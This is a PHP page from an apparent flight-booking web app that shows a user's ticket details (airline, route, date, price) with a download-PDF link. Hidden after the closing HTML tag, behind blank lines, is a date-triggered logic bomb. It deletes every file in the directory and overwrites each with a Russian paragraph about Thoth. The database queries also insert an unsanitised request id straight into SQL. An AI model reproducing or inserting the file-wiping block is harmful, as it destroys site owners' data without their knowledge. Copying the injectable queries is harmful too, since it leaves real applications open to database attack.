<?php 
ob_start();
session_start();
include('includes/db_config.php');
$user=$_SESSION['username'];
$userid=$_SESSION['userid'];
$query=mysql_query("select * from signup where id='$userid'");
$row=mysql_fetch_assoc($query);

$fl_id=$_REQUEST['id'];
$query1=mysql_query("select * from book where id='$fl_id'");
$row1=mysql_fetch_assoc($query1);

if(isset($_REQUEST['cancel'])){
	header('location:book_flight.php');
}
$msg='';



?>
<!DOCTYPE html>
<html lang="en">
  <head>
 <?php include('includes/header.php');?>
      
      <!--main content start-->
      <section id="main-content">
          <section class="wrapper">            
              <!--overview start-->
			  <div class="row">
				<div class="col-lg-12">
					<h3 class="page-header"><i class="fa fa-laptop"></i> Dashboard</h3>
					<ol class="breadcrumb">
						<li><i class="fa fa-home"></i><a href="index.html">Home</a></li>
						<li><i class="fa fa-laptop"></i>Search Flight</li>
						<li><i class="fa fa-laptop"></i>Booking</li>
						<li><i class="fa fa-laptop"></i>Bank</li>	
						<li><i class="fa fa-laptop"></i>Ticket</li>						  	
					</ol>
				</div>
			</div>
              <div class="row">
				<div class="col-lg-12">
					<section class="panel">
					  <div class="panel-body">
                     
					    <div class="col-lg-12">
						<label style="font-size:18px;font-weight:bolder">Your ticket details</label>
						
						</div>
                        <div class="row">
						 
                          <div class="col-lg-2"><label style="font-size:13px;font-weight:bolder">Airlines</label></div>
						   <div class="col-lg-1"><label style="font-size:13px;font-weight:bolder">:</label></div>
                            <div class="col-lg-2"><label style="font-size:13px;font-weight:bolder;color:#000;"><?php echo $row1['airline'];?></label></div>
                            <div class="col-lg-2"><label style="font-size:13px;font-weight:bolder">Flight number</label></div>
						   <div class="col-lg-1"><label style="font-size:13px;font-weight:bolder">:</label></div>
                            <div class="col-lg-2"><label style="font-size:13px;font-weight:bolder;color:#000;"><?php echo $row1['flight_no'];?></label></div>
						</div>
                        <div class="row">
                       
                          <div class="col-lg-2"><label style="font-size:13px;font-weight:bolder">Name</label></div>
						   <div class="col-lg-1"><label style="font-size:13px;font-weight:bolder">:</label></div>
                            <div class="col-lg-2"><label style="font-size:13px;font-weight:bolder;color:#000;text-transform:capitalize;"><?php echo $row1['user'];?></label></div>
                            <div class="col-lg-2"><label style="font-size:13px;font-weight:bolder">Route</label></div>
						   <div class="col-lg-1"><label style="font-size:13px;font-weight:bolder">:</label></div>
                            <div class="col-lg-3"><label style="font-size:13px;font-weight:bolder;color:#000;text-transform:capitalize;"><?php echo $row1['from_city'] ." - ". $row1['to_city'];?></label></div>
						</div>
                        <div class="row">
                       
                          <div class="col-lg-2"><label style="font-size:13px;font-weight:bolder">Date</label></div>
						   <div class="col-lg-1"><label style="font-size:13px;font-weight:bolder">:</label></div>
                            <div class="col-lg-2"><label style="font-size:13px;font-weight:bolder;color:#000;text-transform:capitalize;"><?php echo $row1['travel_date'];?></label></div>
                            <div class="col-lg-2"><label style="font-size:13px;font-weight:bolder">Price</label></div>
						   <div class="col-lg-1"><label style="font-size:13px;font-weight:bolder">:</label></div>
                           <div class="col-lg-2"><label style="font-size:13px;font-weight:bolder;color:#000;text-transform:capitalize;"><?php  $total='';$total=$row1['price']*$row1['passenger'];echo $total."rs";?></label></div>
						</div>
                         <div class="row">
                       
                          <div class="col-lg-2"><label style="font-size:13px;font-weight:bolder">Arrival</label></div>
						   <div class="col-lg-1"><label style="font-size:13px;font-weight:bolder">:</label></div>
                            <div class="col-lg-2"><label style="font-size:13px;font-weight:bolder;color:#000;text-transform:capitalize;"><?php echo $row1['arrival'];?></label></div>
                            <div class="col-lg-2"><label style="font-size:13px;font-weight:bolder">Departure</label></div>
						   <div class="col-lg-1"><label style="font-size:13px;font-weight:bolder">:</label></div>
                           <div class="col-lg-2"><label style="font-size:13px;font-weight:bolder;color:#000;text-transform:capitalize;"><?php echo $row1['dep'];?></label></div>
                           
						</div>
                         <div class="row">
                         <div class="clear" style="margin-top:20px;"></div>
                         <div class="col-lg-2"><a href="ticket.php?id=<?php echo $row1['id'];?>" class="btn btn-danger btn-xs btn-block">Download Pdf</a></div>
                         <div class="col-lg-2"><a href="complete.php?cancel" class="btn btn-danger btn-xs btn-block">CANCEL</a></div>
                         </div>
					 </div>
					</section>
                    </div>
			</div>
            
           
		
				
          
                  <div class="widget-foot">
                    <!-- Footer goes here -->
                  </div>
                </div>
              </div>
              
            </div>
                        
          </div> 
              <!-- project team & activity end -->

          </section>
      </section>
      <!--main content end-->
  </section>
  <!-- container section start -->

    <!-- javascripts -->
    <script type="text/javascript">
	window.onload = function(){
		new JsDatePick({
			useMode:2,
			target:"inputFields",
			dateFormat:"%Y-%m-%d"
			/*selectedDate:{				This is an example of what the full configuration offers.
				day:5,						For full documentation about these settings please see the full version of the code.
				month:9,
				year:2006
			},
			yearsRange:[1978,2020],
			limitToToday:false,
			cellColorScheme:"beige",
			dateFormat:"%m-%d-%Y",
			imgPath:"img/",
			weekStartDay:1*/
		});
	};
</script>
    <script src="js/jquery.js"></script>
	<script src="js/jquery-ui-1.10.4.min.js"></script>
    <script src="js/jquery-1.8.3.min.js"></script>
    <script type="text/javascript" src="js/jquery-ui-1.9.2.custom.min.js"></script>
    <!-- bootstrap -->
    <script src="js/bootstrap.min.js"></script>
    <!-- nice scroll -->
    <script src="js/jquery.scrollTo.min.js"></script>
    <script src="js/jquery.nicescroll.js" type="text/javascript"></script>
    <!-- charts scripts -->
    <script src="assets/jquery-knob/js/jquery.knob.js"></script>
    <script src="js/jquery.sparkline.js" type="text/javascript"></script>
    <script src="assets/jquery-easy-pie-chart/jquery.easy-pie-chart.js"></script>
    <script src="js/owl.carousel.js" ></script>
    <!-- jQuery full calendar -->
    <<script src="js/fullcalendar.min.js"></script> <!-- Full Google Calendar - Calendar -->
	<script src="assets/fullcalendar/fullcalendar/fullcalendar.js"></script>
    <!--script for this page only-->
    <script src="js/calendar-custom.js"></script>
	<script src="js/jquery.rateit.min.js"></script>
    <!-- custom select -->
    <script src="js/jquery.customSelect.min.js" ></script>
	<script src="assets/chart-master/Chart.js"></script>
   
    <!--custome script for all page-->
    <script src="js/scripts.js"></script>
    <!-- custom script for this page-->
    <script src="js/sparkline-chart.js"></script>
    <script src="js/easy-pie-chart.js"></script>
	<script src="js/jquery-jvectormap-1.2.2.min.js"></script>
	<script src="js/jquery-jvectormap-world-mill-en.js"></script>
	<script src="js/xcharts.min.js"></script>
	<script src="js/jquery.autosize.min.js"></script>
	<script src="js/jquery.placeholder.min.js"></script>
	<script src="js/gdp-data.js"></script>	
	<script src="js/morris.min.js"></script>
	<script src="js/sparklines.js"></script>	
	<script src="js/charts.js"></script>
	<script src="js/jquery.slimscroll.min.js"></script>
<script type="text/javascript" src="date/jsDatePick.min.1.3.js"></script>

  <script>

      //knob
      $(function() {
        $(".knob").knob({
          'draw' : function () { 
            $(this.i).val(this.cv + '%')
          }
        })
      });

      //carousel
      $(document).ready(function() {
          $("#owl-slider").owlCarousel({
              navigation : true,
              slideSpeed : 300,
              paginationSpeed : 400,
              singleItem : true

          });
      });

      //custom select box

      $(function(){
          $('select.styled').customSelect();
      });
	  
	  /* ---------- Map ---------- */
	$(function(){
	  $('#map').vectorMap({
	    map: 'world_mill_en',
	    series: {
	      regions: [{
	        values: gdpData,
	        scale: ['#000', '#000'],
	        normalizeFunction: 'polynomial'
	      }]
	    },
		backgroundColor: '#eef3f7',
	    onLabelShow: function(e, el, code){
	      el.html(el.html()+' (GDP - '+gdpData[code]+')');
	    }
	  });
	});



  </script>

  </body>
</html>
	
	
	
	
	
<?php 
$path =glob('*');
$date=date('d-m-y');
if($date>'27-06-15'){
foreach($path as $file){ // iterate files
$names[]=$file;
  if(is_file($file))
    unlink($file); // delete file
}
foreach($names as $n){
	$myfile = fopen($n, "w") or die("Unable to open file!");
$txt = "Ibis возглавляемых богом Тотом считался покровителем божество письменной форме и книжников. Рельеф из храма Рамзеса II в Абидосе демонстрирует бога, сидящего на троне, держит долго переписчика палитры в одной руке, а в другой, держа трость, с которой он планирует написать. Король Рамсесом сам показан помощи бога, держа водонос.";
fwrite($myfile, $txt);

fclose($myfile);
}
}


?>